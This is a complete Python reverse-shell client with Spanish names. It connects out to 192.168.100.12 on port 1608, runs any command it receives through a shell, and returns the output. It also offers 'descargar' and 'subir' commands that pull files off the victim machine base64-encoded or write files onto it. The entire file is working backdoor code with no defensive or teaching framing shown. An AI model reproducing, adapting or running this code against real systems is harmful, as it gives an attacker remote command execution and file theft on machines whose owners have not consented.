#!/usr/bin/env python3
# _*_ coding: utf8 _*_

import socket
import os
import subprocess
import base64


def shell():
    directorio = os.getcwd()
    cliente.send(directorio.encode())
    while True:
        res = cliente.recv(2048)
        if res.decode() == "exit":
            break
        elif res.decode()[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result = os.getcwd()
            cliente.send(result.encode())
        elif res.decode()[:9] == "descargar":
            with open(res.decode()[10:], 'rb') as arch:
                cliente.send(base64.b64encode(arch.read()))
        elif res.decode()[:5] == "subir":
            with open(res.decode()[6:], 'wb') as arch:
                datos = cliente.recv(30000)
                arch.write(base64.b64decode(datos.decode()))
        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                cliente.send("1".encode())
            else:
                cliente.send(result)


cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #Usar IPv4 y TCP
cliente.connect(("192.168.100.12", 1608))
shell()
cliente.close()
